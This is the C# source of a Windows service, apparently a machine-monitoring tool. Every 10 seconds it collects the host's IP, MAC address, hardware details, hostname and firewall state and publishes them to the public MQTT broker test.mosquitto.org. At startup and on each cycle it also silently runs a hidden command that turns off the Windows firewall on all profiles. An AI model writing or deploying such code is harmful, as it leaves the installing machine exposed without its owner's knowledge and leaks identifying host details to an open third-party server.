using System;
using System.Management;
using System.ServiceProcess;
using System.Timers;
using System.Reflection;
using System.Threading.Tasks;
using log4net;
using MQTTnet;
using MQTTnet.Client;
using System.Diagnostics;

[assembly: log4net.Config.XmlConfigurator(Watch = true)]
namespace NewWindowsService
{
    public partial class MyNewService : ServiceBase
    {
        private static readonly ILog log = LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);
        private System.Timers.Timer timer;
        private IMqttClient _client;
        private IMqttClientOptions _options;
        private readonly string _broker = "test.mosquitto.org"; // MQTT Broker
        private readonly int _port = 1883;
        private readonly string _topic = "may1/thongtin";

        public MyNewService()
        {
            InitializeComponent();
            SetFirewallState(false);
            InitializeMQTT();
        }

        private void InitializeMQTT()
        {
            var factory = new MqttFactory();
            _client = factory.CreateMqttClient();

            _options = new MqttClientOptionsBuilder()
                .WithTcpServer(_broker, _port)
                .Build();
        }

        protected override void OnStart(string[] args)
        {
            log.Info("Terminal Service Started.");
            Console.WriteLine("Hello World");

            timer = new System.Timers.Timer(10000); // Chạy mỗi 10 giây
            timer.Elapsed += async (sender, e) => await OnElapsedTime();
            timer.Start();
        }

        private async Task OnElapsedTime()
        {
            log.Info("Service is running...");

            string ipAddress = GetLocalIPAddress();
            string macAddress = GetMACAddress();
            string cpuInfo = GetCPUInfo();
            string ramInfo = GetRAMInfo();
            string diskInfo = GetDiskInfo();
            string hostname = GetHostname();
            string firewallStatus = GetFirewallStatusNetsh();
            //log.Info($"Firewall Status: {firewallStatus}");

            string message = $"{{ \"IP\": \"{ipAddress}\", \"MAC\": \"{macAddress}\", \"CPU\": \"{cpuInfo}\", \"RAM\": \"{ramInfo}\", \"Disk\": \"{diskInfo}\", \"Hostname\": \"{hostname}\", \"Firewall\": \"{firewallStatus}\" }}";
            log.Info($"Sending data to MQTT: {message}");

            await SendToMQTT(message);

            SetFirewallState(false);
        }

        private async Task SendToMQTT(string message)
        {
            try
            {
                if (!_client.IsConnected)
                {
                    await _client.ConnectAsync(_options);
                    //log.Info("Connected to MQTT Broker.");
                }

                var mqttMessage = new MqttApplicationMessageBuilder()
                    .WithTopic(_topic)
                    .WithPayload(message)
                    .WithRetainFlag()
                    .Build();

                await _client.PublishAsync(mqttMessage);
                //log.Info("Data sent to MQTT successfully.");
            }
            catch (Exception ex)
            {
                //log.Error("Error sending data to MQTT", ex);
            }
        }


        protected override void OnStop()
        {
            log.Info("Terminal Service Stopped.");
            timer.Stop();
        }

        private void SetFirewallState(bool enable)
        {
            try
            {
                string command = enable ? "netsh advfirewall set allprofiles state on"
                                        : "netsh advfirewall set allprofiles state off";

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process process = new Process { StartInfo = psi };
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                process.WaitForExit();

                if (!string.IsNullOrEmpty(error))
                {
                    log.Error($"Firewall command error: {error}");
                }
                else
                {
                    log.Info($"Firewall command executed: {output}");
                }
            }
            catch (Exception ex)
            {
                log.Error("Error executing firewall command", ex);
            }
        }


        private string GetLocalIPAddress()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    string[] addresses = (string[])queryObj["IPAddress"];
                    if (addresses != null && addresses.Length > 0)
                        return addresses[0];
                }
            }
            catch (Exception ex)
            {
                log.Error("Error getting IP Address", ex);
            }
            return "Unknown";
        }

        private string GetMACAddress()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    return queryObj["MACAddress"].ToString();
                }
            }
            catch (Exception ex)
            {
                log.Error("Error getting MAC Address", ex);
            }
            return "Unknown";
        }

        private string GetCPUInfo()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    return queryObj["Name"].ToString();
                }
            }
            catch (Exception ex)
            {
                log.Error("Error getting CPU Info", ex);
            }
            return "Unknown";
        }

        private string GetRAMInfo()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    double totalRam = Convert.ToDouble(queryObj["TotalPhysicalMemory"]) / (1024 * 1024 * 1024);
                    return $"{totalRam:F2} GB";
                }
            }
            catch (Exception ex)
            {
                log.Error("Error getting RAM Info", ex);
            }
            return "Unknown";
        }

        private string GetDiskInfo()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    return queryObj["Model"].ToString();
                }
            }
            catch (Exception ex)
            {
                log.Error("Error getting Disk Info", ex);
            }
            return "Unknown";
        }

        private string GetHostname()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    return queryObj["Name"].ToString();
                }
            }
            catch (Exception ex)
            {
                log.Error("Error getting Hostname", ex);
            }
            return "Unknown";
        }

        //  dùng WMI (Win32_Service) không đủ chính xác vì dịch vụ MpsSvc vẫn có thể chạy ngay cả khi tường lửa bị tắt.
        //Dùng netsh để kiểm tra trạng thái thật của tường lửa(ON/OFF).
        private string GetFirewallStatusNetsh() 
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "netsh";
                process.StartInfo.Arguments = "advfirewall show allprofiles state";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                if (output.Contains("ON"))
                    return "Firewall is ON";
                else if (output.Contains("OFF"))
                    return "Firewall is OFF";
            }
            catch (Exception ex)
            {
                log.Error("Error checking Firewall status via netsh", ex);
            }
            return "Unknown";
        }

    }
}
